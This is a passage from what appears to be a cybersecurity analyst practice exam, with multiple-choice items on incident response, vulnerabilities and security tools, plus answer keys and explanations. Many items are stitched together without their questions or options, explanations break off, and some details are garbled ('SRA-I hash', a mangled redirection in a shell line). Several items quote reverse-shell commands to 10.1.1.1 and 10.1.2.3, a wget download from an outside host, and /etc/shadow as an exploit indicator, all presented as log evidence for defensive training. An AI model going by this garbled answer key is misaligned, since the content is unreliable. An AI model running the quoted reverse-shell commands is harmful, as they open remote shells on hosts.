## QUESTION 22

> A company\'s user accounts have been compromised. Users are also
> reporting that the company\'s internal portal is sometimes only
> accessible through HTTP, other times; it is accessible through HTTPS.
> Which of the following most likely describes the observed activity?

A.  There is an issue with the SSL certificate causing port 443 to
    become unavailable for HTTPS access

B.  An on-path attack is being performed by someone with internal access
    that forces users into port 80

C.  The web server cannot handle an increasing amount of HTTPS requests
    so it forwards users to port 80

D.  An error was caused by BGP due to new rules applied over the
    company\'s internal routers

### Answer: B 

### Explanation:

> The fact that the company\'s internal portal is sometimes accessible
> through HTTP (port 80) and other times through HTTPS (port 443)
> suggests that someone with internal access is actively manipulating
> the network traffic. An on-path attack is a type of man-in-the-middle
> attack where an attacker intercepts and modifies communication between
> two parties. By forcing users into using HTTP instead of HTTPS, the
> attacker can potentially capture sensitive information transmitted
> over the network, such as login credentials or session data.
>
> An issue with the SSL certificate (Option A) would generally result in
> HTTPS not working at all, rather than it being intermittently
> accessible.
>
> A web server unable to handle an increasing amount of HTTPS requests
> (Option C) would likely result in performance issues or server errors,
> but it wouldn\'t selectively redirect users to HTTP. BGP (Border
> Gateway Protocol) is used for routing between autonomous systems on
> the internet, and it generally would not cause the internal portal to
> switch between HTTP and HTTPS. It is more relevant to external
> internet routing.

>
> Which of the following is being attempted?

A.  RCE

B.  Reverse shell

C.  XSS

D.  SQL injection

### Answer: B 

### Explanation:

> A reverse shell is a type of shell access that allows a remote user to
> execute commands on a target system or network by reversing the normal
> direction of communication. A reverse shell is usually created by
> running a malicious script or program on the target system that
> connects back to the remote user\'s system and opens a shell session.
> A reverse shell can bypass firewalls or other security controls that
> block incoming connections, as it uses an outgoing connection
> initiated by the target system. In this case, the security analyst has
> detected an exploit attempt containing the following command:
>
> sh -i \>& /dev/udp/10.1.1.1/4821 0\>\$l
>
> This command is a shell script that creates a reverse shell connection
> from the target system to the remote user\'s system at IP address
> 10.1.1.1 and port 4821 using UDP protocol.

> the following inhibitors to remediation do these systems and
> associated vulnerabilities best represent?

A.  Proprietary systems

B.  Legacy systems

C.  Unsupported operating systems

D.  Lack of maintenance windows

### Answer: A 

### Explanation:

> Proprietary systems are systems that are owned by their developer or
> vendor, and the company does not have access to the source code or
> other necessary information to upgrade or patch the system. This can
> make it difficult to remediate vulnerabilities in proprietary systems,
> as the company may need to rely on the vendor to provide a patch or
> update.
>
> In this case, the two critical systems cannot be upgraded due to a
> vendor appliance that the company does not have access to. This
> suggests that the systems are proprietary, and the company is unable
> to remediate the vulnerabilities without the vendor\'s assistance.

> A VPN (Virtual Private Network) creates a secure and encrypted tunnel
> between the corporate network and the cloud environment. This allows
> the development team to access servers in all three tiers of the cloud
> environment securely, without exposing their traffic to the public
> internet. The other options are not as well-suited for this scenario:
>
> CASB (Cloud Access Security Broker) is a security solution that
> monitors and controls traffic between the corporate network and cloud
> environments. CASBs can be used to enforce security policies, such as
> preventing users from accessing unauthorized cloud resources. However,
> CASBs do not provide secure transport.
>
> VPC (Virtual Private Cloud) is a network service that creates a
> logically isolated section of a cloud environment. VPCs can be used to
> improve security and performance by isolating traffic from different
> workloads. However, VPCs do not provide secure transport between the
> corporate network and the cloud environment.
>
> Federation is a technology that allows users to log in to multiple
> applications using a single set of credentials. Federation can be used
> to improve security and convenience for users. However, federation

> will allow all data to be kept on the third-party network?

A.  VDI

B.  SaaS

C.  CASB

D.  FaaS

### Answer: C 

### Explanation:

> The questions isn\'t asking which cloud model is to be used. It\'s
> asking which of the following choices will ALLOW (give permission,
> authorization, unhindered access) to keep ALL DATA (could be PII or
> other sensitive data) on THIRD-PARTY NETWORK (Cloud Service
> Provider\'s Network). Assuming the IT Management team has chosen SaaS
> as their cloud model, this doesn\'t mention how the data will be

B.  Block the IP range of the scans at the network firewall.

C.  Perform a historical trend analysis and look for similar scanning
    activity.

D.  Block the specific IP address of the scans at the network firewall.

### Answer: A 

### Explanation:

> Geoblocking is a security measure that restricts or blocks access to a
> network based on geographic location by analyzing IP addresses. Since
> the company does not do business with that country, blocking all
> traffic from that country reduces unnecessary and potentially
> malicious traffic, lowering the attack surface and minimizing exposure

> recommendation for remediation of this application vulnerability.
> Input validation is a technique that checks the data entered by users
> or attackers against a set of rules or constraints, such as data type,
> length, format, or range. Input validation can prevent common web
> application attacks such as SQL injection, cross-site scripting (XSS),
> or command injection, which exploit the lack of input validation to
> execute malicious code or commands on the server or the client side.
> By validating the input before allowing submission, the web
> application can reject or sanitize any malicious or unexpected input,
> and protect the user credentials and other sensitive data from being
> compromised.

> of the following metrics should the team lead include in the briefs?

A.  Mean time between failures

B.  Mean time to detect

C.  Mean time to remediate

D.  Mean time to contain

### Answer: D 

### Explanation:

> Mean time to contain is the metric that the cybersecurity team lead
> should include in the weekly executive briefs, as it measures how long
> it takes to stop the spread of malware that enters the network. Mean
> time to contain is the average time it takes to isolate and neutralize
> an incident or a threat, such as malware, from the time it is
> detected. Mean time to contain is an important metric for evaluating
> the effectiveness and efficiency of the incident response process, as
> well as the potential impact and damage of the incident or threat. A
> lower mean time to contain indicates a faster and more successful
> response, which can reduce the risk and cost of the incident or
> threat. Mean time to contain can also be compared with other metrics,
> such as mean time to detect or mean time to remediate, to identify
> gaps or areas for improvement in the incident response process.

## QUESTION 159

> An employee accessed a website that caused a device to become infected
> with invasive malware. The incident response analyst has:

- created the initial evidence log.

- disabled the wireless adapter on the device.

- interviewed the employee, who was unable to identify the website that
  was accessed.

- reviewed the web proxy traffic logs.

> Which of the following should the analyst do to remediate the infected
> device?

A.  Update the system firmware and reimage the hardware.

B.  Install an additional malware scanner that will send email alerts to
    the analyst.

C.  Configure the system to use a proxy server for Internet access.

D.  Delete the user profile and restore data from backup.

### Answer: A 

### Explanation:

> Updating the system firmware and reimaging the hardware is the best
> action to perform to remediate the infected device, as it helps to
> ensure that the device is restored to a clean and secure state and
> that any traces of malware are removed. Firmware is a type of software
> that controls the low-level functions of a hardware device, such as a
> motherboard, hard drive, or network card. Firmware can be updated or
> flashed to fix bugs, improve performance, or enhance security.
> Reimaging is a process of erasing and restoring the data on a storage
> device, such as a hard drive or a solid state drive, using an image
> file that contains a copy of the operating system, applications,
> settings, and files. Reimaging can help to recover from system
> failures, data corruption, or malware infections. Updating the system
> firmware and reimaging the hardware can help to remediate the infected
> device by removing any malicious code or configuration changes that
> may have been made by the malware, as well as restoring any missing or
> damaged files or settings that may have been affected by the malware.
> This can help to prevent further damage, data loss, or compromise of
> the device or the network. The other actions are not as effective or
> appropriate as updating the system firmware and reimaging the
> hardware, as they do not address the root cause of the infection or
> ensure that the device is fully cleaned and secured.
>
> Installing an additional malware scanner that will send email alerts
> to the analyst may help to detect and remove some types of malware,
> but it may not be able to catch all malware variants or remove them
> completely. It may also create conflicts or performance issues with
> other security tools or systems on the device. Configuring the system
> to use a proxy server for Internet access may help to filter or
> monitor some types of malicious traffic or requests, but it may not
> prevent or remove malware that has already infected the device or that
> uses other methods of communication or propagation. Deleting the user
> profile and restoring data from backup may help to recover some data
> or settings that may have been affected by the malware, but it may not
> remove malware that has infected other parts of the system or that has
> persisted on the device.

## QUESTION 160

> A cloud team received an alert that unauthorized resources were being
> auto-provisioned. After investigating, the team suspects that
> cryptomining is occurring. Which of the following indicators would
> most likely lead the team to this conclusion?

A.  High GPU utilization

B.  Bandwidth consumption

C.  Unauthorized changes

D.  Unusual traffic spikes

### Answer: A 

### Explanation:

> High GPU utilization is the most likely indicator that cryptomining is
> occurring, as it reflects the intensive computational work that is
> required to solve the complex mathematical problems involved in mining
> cryptocurrencies. Cryptomining is the process of generating new units
> of a
>
> cryptocurrency by using computing power to verify transactions and
> create new blocks on the blockchain. Cryptomining can be done
> legitimately by individuals or groups who participate in a mining pool
> and share the rewards, or illegitimately by threat actors who use
> malware or scripts to hijack the computing resources of unsuspecting
> victims and use them for their own benefit. This practice is called
> cryptojacking, and it can cause performance degradation, increased
> power consumption, and security risks for the affected systems.
> Cryptomining typically relies on the GPU (graphics processing unit)
> rather than the CPU (central processing unit), as the GPU is better
> suited for parallel processing and can handle more calculations per
> second. Therefore, a high GPU utilization rate can be a sign that
> cryptomining is taking place on a system, especially if there is no
> other
>
> Explanation for the increased workload. The other options are not as
> indicative of cryptomining as high GPU utilization, as they can have
> other causes or
>
> Explanations.
>
> Bandwidth consumption can be affected by many factors, such as network
> traffic, streaming services, downloads, or updates. It is not directly
> related to cryptomining, which does not require a lot of bandwidth to
> communicate with the mining pool or the blockchain network.
> Unauthorized changes can be a result of many types of malware or
> cyberattacks, such as ransomware, spyware, or trojans. They are not
> specific to cryptomining, which does not necessarily alter any files
> or settings on the system, but rather uses its processing power.
> Unusual traffic spikes can also be caused by various factors, such as
> legitimate surges in demand, distributed denial-ofservice attacks, or
> botnets. They are not indicative of cryptomining, which does not
> generate a lot of traffic or requests to or from the system.

> practices?

A.  Help desk

B.  Law enforcement

C.  Legal department

D.  Board member

### Answer: C 

### Explanation:

> The legal department is the most appropriate group to escalate this
> issue to first, as they can advise on the legal implications and
> actions that can be taken against the employee. The legal department

> vulnerability?

A.  A user is required to exploit this vulnerability.

B.  The vulnerability is network based.

C.  The vulnerability does not affect confidentiality.

D.  The complexity to exploit the vulnerability is high.

### Answer: B 

### Explanation:

> The vulnerability is network based is the correct attribute that
> describes this vulnerability, as it can be inferred from the CVSS
> string. CVSS stands for Common Vulnerability Scoring System, which is
> a framework that assigns numerical scores and ratings to
> vulnerabilities based on their characteristics and severity. The CVSS
> string consists of several metrics that define different aspects of
> the vulnerability, such as the attack vector, the attack complexity,
> the privileges required, the user interaction, the scope, and the
> impact on confidentiality, integrity and availability. The first
> metric in the CVSS string is the attack vector (AV), which indicates
> how the vulnerability can be exploited. The value of AV in this case
> is N, which stands for network. This means that the vulnerability can
> be exploited remotely over a network connection, without physical or
> logical access to the target system. Therefore, the vulnerability is
> network based.

B.  To perform attack exercises to check response effectiveness

C.  To understand existing threat actors and how to replicate their
    techniques

D.  To check the effectiveness of the business continuity plan

### Answer: A 

### Explanation:

> A tabletop exercise is a type of simulation exercise that involves
> testing possible incident scenarios and how to react properly, without
> actually performing any actions or using any resources. A tabletop
> exercise is usually conducted by a facilitator who presents a

> A security analyst needs to ensure that systems across the
> organization are protected based on the sensitivity of the content
> each system hosts. The analyst is working with the respective system
> owners to help determine the best methodology that seeks to promote
> confidentiality, availability, and integrity of the data being hosted.
> Which of the following should the security analyst perform first to
> categorize and prioritize the respective systems?

A.  Interview the users who access these systems.

B.  Scan the systems to see which vulnerabilities currently exist.

C.  Configure alerts for vendor-specific zero-day exploits.

D.  Determine the asset value of each system.

### Answer: D 

### Explanation:

> Determining the asset value of each system is the best action to
> perform first, as it helps to categorize and prioritize the systems
> based on the sensitivity of the data they host. The asset value is a
> measure of how important a system is to the organization, in terms of
> its financial, operational, or reputational impact. The asset value
> can help the security analyst to assign a risk level and a protection
> level to each system, and to allocate resources accordingly. The other
> actions are not as effective as determining the asset value, as they
> do not directly address the goal of promoting confidentiality,
> availability, and integrity of the data. Interviewing the users who
> access these systems may provide some insight into how the systems are
> used and what data they contain, but it may not reflect the actual
> value or sensitivity of the data from an organizational perspective.
> Scanning the systems to see which vulnerabilities currently exist may
> help to identify and remediate some security issues, but it does not
> help to categorize or prioritize the systems based on their data
> sensitivity. Configuring alerts for vendor-specific zero-day exploits
> may help to detect and respond to some emerging threats, but it does
> not help to protect the systems based on their data sensitivity.

## QUESTION 170

> A security analyst is reviewing the following alert that was triggered
> by FIM on a critical system:

![](/static/images/image31.jpeg)

> Which of the following best describes the suspicious activity that is
> occurring?

A.  A fake antivirus program was installed by the user.

B.  A network drive was added to allow exfiltration of data.

C.  A new program has been set to execute on system start.

D.  The host firewall on 192.168.1.10 was disabled.

### Answer: C 

### Explanation:

> A new program has been set to execute on system start is the most
> likely cause of the suspicious activity that is occurring, as it
> indicates that the malware has modified the registry keys of the
> system to ensure its persistence. File Integrity Monitoring (FIM) is a
> tool that monitors changes to files and registry keys on a system and
> alerts the security analyst of any unauthorized or malicious
> modifications. The alert triggered by FIM shows that the malware has
> created a new registry key under the Run subkey, which is used to
> launch programs automatically when the system starts. The new registry
> key points to a file named \"update.exe\" in the Temp folder, which is
> likely a malicious executable disguised as a legitimate update file.

## QUESTION 171

> Which of the following best describes the document that defines the
> expectation to network customers that patching will only occur between
> 2:00 a.m. and 4:00 a.m.?

A.  SLA

B.  LOI

C.  MOU

D.  KPI

### Answer: A 

### Explanation:

> SLA (Service Level Agreement) is the best term to describe the
> document that defines the expectation to network customers that
> patching will only occur between 2:00 a.m. and 4:00 a.m., as it
> reflects the agreement between a service provider and a customer that
> specifies the services, quality, availability, and responsibilities
> that are agreed upon. An SLA is a common type of document that is used
> in various industries and contexts, such as IT, telecom, cloud
> computing, or outsourcing. An SLA typically includes metrics and
> indicators to measure the performance and quality of the service, such
> as uptime, response time, or resolution time. An SLA also defines the
> consequences or remedies for any breaches or failures of the service,
> such as penalties, refunds, or credits. An SLA can help to manage
> customer expectations, formalize
>
> communication, improve productivity, and strengthen relationships. The
> other terms are not as accurate as SLA, as they describe different
> types of documents or concepts. LOI (Letter of Intent) is a document
> that outlines the main terms and conditions of a proposed agreement
> between two or more parties, before a formal contract is signed. An
> LOI is usually non-binding and expresses the intention or interest of
> the parties to enter into a future agreement. An LOI can help to
> clarify the key points of a deal, facilitate negotiations, or
> demonstrate commitment. MOU (Memorandum of Understanding) is a
> document that describes a mutual agreement or cooperation between two
> or more parties, without creating any legal obligations or
> commitments. An MOU is usually more formal than an LOI, but less
> formal than a contract. An MOU can help to establish a common ground,
> define roles and responsibilities, or outline expectations and goals.
> KPI (Key Performance Indicator) is a concept that refers to a
> measurable value that demonstrates how effectively an organization or
> individual is achieving its key objectives or goals. A KPI is usually
> quantifiable and specific, such as revenue growth, customer
> satisfaction, or employee retention. A KPI can help to track progress,
> evaluate performance, or identify areas for improvement.

## QUESTION 172

> A cybersecurity analyst is reviewing SIEM logs and observes consistent
> requests originating from an internal host to a blocklisted external
> server. Which of the following best describes the activity that is
> taking place?

A.  Data exfiltration

B.  Rogue device

C.  Scanning

D.  Beaconing

### Answer: D 

### Explanation:

> Beaconing is the best term to describe the activity that is taking
> place, as it refers to the periodic communication between an infected
> host and a blocklisted external server. Beaconing is a common
> technique used by malware to establish a connection with a
> command-and-control (C2) server, which can provide instructions,
> updates, or exfiltration capabilities to the malware.
>
> Beaconing can vary in frequency, duration, and payload, depending on
> the type and sophistication of the malware. The other terms are not as
> accurate as beaconing, as they describe different aspects of malicious
> activity. Data exfiltration is the unauthorized transfer of data from
> a compromised system to an external destination, such as a C2 server
> or a cloud storage service. Data exfiltration can be a goal or a
> consequence of malware infection, but it does not necessarily involve
> blocklisted servers or consistent requests. Rogue device is a device
> that is connected to a network without authorization or proper
> security controls. Rogue devices can pose a security risk, as they can
> introduce malware, bypass firewalls, or access sensitive data.
> However, rogue devices are not necessarily infected with malware or
> communicating with blocklisted servers. Scanning is the process of
> probing a network or a system for vulnerabilities, open ports,
> services, or other information. Scanning can be performed by
> legitimate administrators or malicious actors, depending on the intent
> and authorization. Scanning does not imply consistent requests or
> blocklisted servers, as it can target any network or system.

## QUESTION 173

> An incident response team is working with law enforcement to
> investigate an active web server compromise. The decision has been
> made to keep the server running and to implement compensating controls
> for a period of time. The web service must be accessible from the
> internet via the reverse proxy and must connect to a database server.
> Which of the following compensating controls will help contain the
> adversary while meeting the other requirements? (Choose two).

A.  Drop the tables on the database server to prevent data exfiltration.

B.  Deploy EDR on the web server and the database server to reduce the
    adversary\'s capabilities.

C.  Stop the httpd service on the web server so that the adversary can
    not use web exploits.

D.  Use microsegmentation to restrict connectivity to/from the web and
    database servers.

E.  Comment out the HTTP account in the /etc/passwd file of the web
    server.

F.  Move the database from the database server to the web server.

### Answer: BD

### Explanation:
>
> Deploying EDR on the web server and the database server to reduce the
> adversaries capabilities and using micro segmentation to restrict
> connectivity to/from the web and database servers are two compensating
> controls that will help contain the adversary while meeting the other
> requirements. A compensating control is a security measure that is
> implemented to mitigate the risk of a vulnerability or an attack when
> the primary control is not feasible or effective. EDR stands for
> Endpoint Detection and Response, which is a tool that monitors
> endpoints for malicious activity and provides automated or manual
> response capabilities. EDR can help contain the adversary by detecting
> and blocking their actions, such as data exfiltration, lateral
> movement, privilege escalation, or command execution. Micro
> segmentation is a technique that divides a network into smaller
> segments based on policies and rules, and applies granular access
> controls to each segment. Micro segmentation can help contain the
> adversary by isolating the web and database servers from other parts
> of the network, and limiting the traffic that can flow between them.

## QUESTION 174

> An incident response team member is triaging a Linux server. The
> output is shown below:

![](/static/images/image32.jpeg)

> Which of the following is the adversary most likely trying to do?

A.  Create a backdoor root account named zsh.

B.  Execute commands through an unsecured service account.

C.  Send a beacon to a command-and-control server.

D.  Perform a denial-of-service attack on the web server.

### Answer: B 

### Explanation:

### 

> The log output indicates an attempt to execute a command via an
> unsecured service account, specifically using a wget command to
> download a file from an external source. This suggests that the
> adversary is trying to exploit a vulnerability in the web server to
> run unauthorized commands, which is a common technique for gaining a
> foothold or further compromising the system. The presence of wget
> <http://grohl.ve.da/tmp/brkgtr.zip> indicates an attempt to download

## QUESTION 175

> A SOC analyst identifies the following content while examining the
> output of a debugger command over a client-server application:
>  

> *getConnection(database01,\"alpha\" ,\"AxTv.127GdCx94GTd\");*
>  

> Which of the following is the most likely vulnerability in this
> system?

A.  Lack of input validation

B.  SQL injection

C.  Hard-coded credential

D.  Buffer overflow

### Answer: C 

### Explanation:

> The most likely vulnerability in this system is hard-coded credential.
> Hard-coded credential is a practice of embedding or storing a
> username, password, or other sensitive information in the source code
> or configuration file of a system or application. Hard-coded
> credential can pose a serious security risk, as it can expose the
> system or application to unauthorized access, data theft, or
> compromise if the credential is discovered or leaked by an attacker.
> Hard-coded credential can also make it difficult to change or update
> the credential if needed, as it may require modifying the code or file
> and redeploying the system or application.

## QUESTION 176

> A technician is analyzing output from a popular network mapping tool
> for a PCI audit:
>
![](/static/images/image33.jpeg)
>
> Which of the following best describes the output?

A.  The host is not up or responding.

B.  The host is running excessive cipher suites.

C.  The host is allowing insecure cipher suites.

D.  The Secure Shell port on this host is closed.

### Answer: C 

### Explanation:

> The output shows the result of running the ssl-enum-ciphers script
> with Nmap, which is a tool that can scan web servers for supported
> SSL/TLS cipher suites. Cipher suites are combinations of cryptographic
> algorithms that are used to establish secure communication between a
> client and a server. The output shows the cipher suites that are
> supported by the server, along with a letter grade (A through F)
> indicating the strength of the connection. The output also shows the
> least strength, which is the strength of the weakest cipher offered by
> the server. In this case, the least strength is F, which means that
> the server is allowing insecure cipher suites that are vulnerable to
> attacks or have been deprecated. For example, the output shows that
> the server supports SSLv3, which is an outdated and insecure protocol
> that is susceptible to the POODLE attack. The output also shows that
> the server supports RC4, which is a weak and broken stream cipher that
> should not be used. Therefore, the best description of the output is
> that the host is allowing insecure cipher suites. The other
> descriptions are not accurate, as they do not reflect what the output
>
> shows. The host is not up or responding is incorrect, as the output
> clearly shows that the host is up and responding to the scan. The host
> is running excessive cipher suites is incorrect, as the output does
> not indicate how many cipher suites the host is running, only which
> ones it supports. The Secure Shell port on this host is closed is
> incorrect, as the output does not show anything about port 22, which
> is the default port for Secure Shell (SSH). The output only shows
> information about port 443, which is the default port for HTTPS.

## QUESTION 177

> A managed security service provider is having difficulty retaining
> talent due to an increasing workload caused by a client doubling the
> number of devices connected to the network. Which of the following
> would best aid in decreasing the workload without increasing staff?

A.  SIEM

B.  XDR

C.  SOAR

D.  EDR

### Answer: C 

### Explanation:

> SOAR stands for Security Orchestration, Automation and Response, which
> is a set of features that can help security teams manage, prioritize
> and respond to security incidents more efficiently and effectively.
> SOAR can help decrease the workload without increasing staff by
> automating repetitive tasks, streamlining workflows, integrating
> different tools and platforms, and providing actionable insights and
> recommendations. SOAR is also one of the current trends that CompTIA
> CySA+ covers in its exam objectives.

## QUESTION 178

> An employee is suspected of misusing a company-issued laptop. The
> employee has been suspended pending an investigation by human
> resources. Which of the following is the best step to preserve
> evidence?

A.  Disable the user\'s network account and access to web resources.

B.  Make a copy of the files as a backup on the server.

C.  Place a legal hold on the device and the user\'s network share.

D.  Make a forensic image of the device and create a SHA-1 hash.

### Answer: D 

### Explanation:

> Making a forensic image of the device and creating a SRA-I hash is the
> best step to preserve evidence, as it creates an exact copy of the
> device\'s data and verifies its integrity. A forensic image is a
> bit-by-bit copy of the device\'s storage media, which preserves all
> the information on the device, including deleted or hidden files. A
> SRA-I hash is a cryptographic value that is calculated from the
> forensic image, which can be used to prove that the image has not been
> altered or tampered with. The other options are not as effective as
> making a forensic image and creating a SRA-I hash, as they may not
> capture all the relevant data, or they may not provide sufficient
> verification of the evidence\'s authenticity.

>
> Which of the following malicious activities was attempted?

A.  Command injection

B.  XML injection

C.  Server-side request forgery

D.  Cross-site scripting

### Answer: D 

### Explanation:

> XSS is a type of web application attack that exploits the
> vulnerability of a web server or browser to execute malicious scripts
> or commands on the client-side. XSS attackers inject malicious code,
> such as JavaScript, VBScript, HTML, or CSS, into a web page or
> application that is viewed by other users. The malicious code can then
> access or manipulate the user\'s session, cookies, browser history, or
> personal information, or perform actions on behalf of the user, such
> as stealing credentials, redirecting to phishing sites, or installing
> malware The line in the web server log shows an example of an XSS
> attack using VBScript. The attacker tried to insert an \<IMG\> tag
> with a malicious SRC attribute that contains a VBScript code. The
> VBScript code is intended to display a message box with the text
> \"test\" when the user views the web page or application. This is a
> simple and harmless example of XSS, but it could be used to test the
> vulnerability of the web server or browser, or to launch more
> sophisticated and harmful attacks.

C.  A new VPN gateway has been deployed.

D.  A social engineering attack is underway.

### Answer: D 

### Explanation:

> A social engineering attack is underway is the most likely
>
> Explanation for the outbound traffic to a host IP that resolves to
> [https://offce365password.acme.co,]
> while the site\'s standard VPN logon page is
> [www.acme.com/logon.] A social engineering

## QUESTION 183

> A security analyst is performing vulnerability scans on the network.
> The analyst installs a scanner appliance, configures the subnets to
> scan, and begins the scan of the network. Which of the following would
> be missing from a scan performed with this configuration?

A.  Operating system version

B.  Registry key values

C.  Open ports

D.  IP address

### Answer: B 

### Explanation:

> Registry key values would be missing from a scan performed with this
> configuration, as the scanner appliance would not have access to the
> Windows Registry of the scanned systems. The Windows Registry is a
> database that stores configuration settings and options for the
> operating system and installed applications. To scan the Registry, the
> scanner would need to have credentials to log in to the systems and
> run a local agent or script. The other items would not be missing from
> the scan, as they can be detected by the scanner appliance without
> credentials.
>
> Operating system version can be identified by analyzing service
> banners or fingerprinting techniques. Open ports can be discovered by
> performing a port scan or sending probes to common ports. IP address
> can be obtained by resolving the hostname or using network discovery
> tools.

## QUESTION 184

> A security analyst discovers an LFI vulnerability that can be
> exploited to extract credentials from the underlying host. Which of
> the following patterns can the security analyst use to search the web
> server logs for evidence of exploitation of that particular
> vulnerability?

A.  /etc/shadow

B.  curl localhost

C.  ; printenv

D.  cat /proc/self/

### Answer: A 

### Explanation:

> /etc/shadow is the pattern that the security analyst can use to search
> the web server logs for evidence of exploitation of the LFI
> vulnerability that can be exploited to extract credentials from the
> underlying host. LFI stands for Local File Inclusion, which is a
> vulnerability that allows an attacker to include local files on the
> web server into the output of a web application. LFI can be exploited
> to extract sensitive information from the web server, such as
> configuration files, passwords, or source code. The /etc/shadow file
> is a file that stores the encrypted passwords of all users on a Linux
> system. If an attacker can exploit the LFI vulnerability to include
> this file into the web application output, they can obtain the
> credentials of the users on the web server.
>
> Therefore, the security analyst can look for /etc/shadow in the
> request line of the web server logs to see if any attacker has
> attempted or succeeded in exploiting the LFI vulnerability.

## QUESTION 185

> A company is in the process of implementing a vulnerability management
> program. Which of the following scanning methods should be implemented
> to minimize the risk of OT/ICS devices malfunctioning due to the
> vulnerability identification process?

A.  Non-credentialed scanning

B.  Passive scanning

C.  Agent-based scanning

D.  Credentialed scanning

### Answer: B 

### Explanation:

> Passive scanning is a method of vulnerability identification that does
> not send any packets or probes to the target devices, but rather
> observes and analyzes the network traffic passively. Passive scanning
> can minimize the risk of OT/ICS devices malfunctioning due to the
> vulnerability identification process, as it does not interfere with
> the normal operation of the devices or cause any network disruption.
> Passive scanning can also detect vulnerabilities that active scanning
> may miss, such as misconfigured devices, rogue devices or unauthorized
> traffic.

A.  SOAR

B.  SIEM

C.  SLA

D.  IoC

### Answer: A 

### Explanation:

> SOAR (Security Orchestration, Automation, and Response) is the best

### Answer: D 

### Explanation:

> The root cause analysis identifies the contributing items that

A.  Command and control

B.  Data enrichment

C.  Automation

D.  Single sign-on

### Answer: C 

### Explanation:

> Automation is the best concept to describe the example, as it reflects
> the use of technology to perform tasks or processes without human
> intervention. Automation can help to improve efficiency, accuracy,
> consistency, and scalability of various operations, such as identity
> and access management (IAM). IAM is a security framework that enables
> organizations to manage the identities and access rights of users and
> devices across different systems and applications. IAM can help to
> ensure that only authorized users and devices can access the
> appropriate resources at the appropriate time and for the appropriate
> purpose. IAM can involve various tasks or processes, such as
> authentication, authorization, provisioning, deprovisioning, auditing,
> or reporting. Automation can help to simplify and streamline these
> tasks or processes by using software tools or scripts that can execute
> predefined actions or workflows based on certain triggers or
> conditions. For example, automation can help to create, update, or
> delete user accounts in bulk based on a file or a database, rather
> than manually entering or modifying each account individually. The
> example in the question shows that an API is used to insert bulk
> access requests from a file into an identity management system. An API
> (Application Programming Interface) is a set of rules or
> specifications that defines how different software components or
> systems can communicate and exchange data with each other. An API can
> help to enable automation by providing a standardized and consistent
> way to access and manipulate data or functionality of a software
> component or system. The example in the question shows that an API is
> used to automate the process of inserting bulk access requests from a
> file into an identity management system, rather than manually entering
> each request one by one. The other options are not correct, as they

## QUESTION 192

## 

> A SOC analyst recommends adding a layer of defense for all endpoints
> that will better protect against external threats regardless of the
> device\'s operating system. Which of the following best meets this
> requirement?

A.  SIEM

B.  CASB

C.  SOAR

D.  EDR

### Answer: D 

### Explanation:

> EDR stands for Endpoint Detection and Response, which is a layer of
> defense that monitors endpoints for malicious activity and provides
> automated or manual response capabilities. EDR can protect against
> external threats regardless of the device\'s operating system, as it

## QUESTION 193

> A security analyst identified the following suspicious entry on the
> host-based IDS logs:
>
> bash -i >& /dev/tcp/10.1.2.3/8080 0>&1
>
> Which of the following shell scripts should the analyst use to most
> accurately confirm if the activity is ongoing?

A. #!/bin/bash nc 10.1.2.3 8080 -vv >dev/null && echo "Malicious activity" || echo "OK" 

B. #!/bin/bash ps -fea | grep 8080 >dev/null && echo "Malicious activity" || echo "OK" 

C. #!/bin/bash ls /opt/tcp/10.1.2.3/8080 >dev/null && echo "Malicious activity" || echo "OK" 

D. #!/bin/bash netstat -antp | grep 8080 >dev/null && echo "Malicious activity" || echo "OK"

### Answer: D 

### Explanation:

> The suspicious entry on the host-based IDS logs indicates that a
> reverse shell was executed on the host, which connects to the remote
> IP address 10.1.2.3 on port 8080. The shell script option D uses the
> netstat command to check if there is any active connection to that IP
> address and port, and prints \"Malicious activity\" if there is, or
> \"OK\" otherwise. This is the most accurate way to confirm if the
> reverse shell is still active, as the other options may not detect the
> connection or may produce false positives.

## QUESTION 194

> A company is concerned with finding sensitive file storage locations
> that are open to the public. The current internal cloud network is
> flat. Which of the following is the best solution to secure the
> network?

A.  Implement segmentation with ACLs.

B.  Configure logging and monitoring to the SIEM.

C.  Deploy MFA to cloud storage locations.

D.  Roll out an IDS.

### Answer: A 

### Explanation:

### 

> Implementing segmentation with ACLs is the best solution to secure the
> network. Segmentation is the process of dividing a network into
> smaller subnetworks, or segments, based on criteria such as function,
> location, or security level. Segmentation can help improve the network
> performance, scalability, and manageability, as well as enhance the
> network security by isolating the sensitive or critical data and
> systems from the rest of the network. ACLs are Access Control Lists,
> which are rules or policies that specify which users, devices, or
> applications can access a network segment or resource, and which
> actions they can perform. ACLs can help enforce the principle of least
> privilege, and prevent unauthorized or malicious access to the network
> segments or resources.

## QUESTION 195

> A security analyst is reviewing the findings of the latest
> vulnerability report for a company\'s web application. The web
> application accepts files for a Bash script to be processed if the
> files match a given hash. The analyst is able to submit files to the
> system due to a hash collision. Which of the following should the
> analyst suggest to mitigate the vulnerability with the fewest changes
> to the current script and infrastructure?

A.  Deploy a WAF to the front of the application.

B.  Replace the current MD5 with SHA-256.

C.  Deploy an antivirus application on the hosting system.

D.  Replace the MD5 with digital signatures.

### Answer: B 

### Explanation:

> The vulnerability that the security analyst is able to exploit is a
> hash collision, which is a situation where two different files produce
> the same hash value. Hash collisions can allow an attacker to bypass
> the integrity or authentication checks that rely on hash values, and
> submit malicious files to the system. The web application uses MD5,
> which is a hashing algorithm that is known to be vulnerable to hash
> collisions. Therefore, the analyst should suggest replacing the
> current MD5 with SHA-256, which is a more secure and
> collision-resistant hashing algorithm.

    and unencrypted USBs.

B.  Write a removable media policy that explains that USBs cannot be
    connected to a company asset.

C.  Check configurations to determine whether USB ports are enabled on
    company assets.

D.  Review logs to see whether this exploitable vulnerability has
    already impacted the company.

### Answer: C 

### Explanation:

> USB ports are a common attack vector that can be used to deliver
> malware, steal data, or compromise systems. The first step to mitigate
> this vulnerability is to check the configurations of the company
> assets and disable or restrict the USB ports if possible. This will

> memory. Which of the following tools would best help to prove whether
> this server was experiencing this behavior?

A.  Nmap

B.  TCPDump

C.  SIEM

D.  EDR

### Answer: B 

### Explanation:

> TCPDump is the best tool to prove whether the server was experiencing
> a DoS attack related to half- open TCP sessions consuming memory.
> TCPDump is a command-line tool that can capture and analyze network
> traffic, such as TCP, UDP, and ICMP packets. TCPDump can help the
> administrator to identify the source and destination of the traffic,
> the TCP flags and sequence numbers, the packet size and frequency, and
> other information that can indicate a DoS attack. A DoS attack related
> to half- open TCP sessions is also known as a SYN flood attack, which
> is a type of volumetric attack that aims to exhaust the network
> bandwidth or resources of the target server by sending a large amount
> of TCP SYN requests and ignoring the TCP SYN-ACK responses. This
> creates a backlog of half-open connections on the server, which
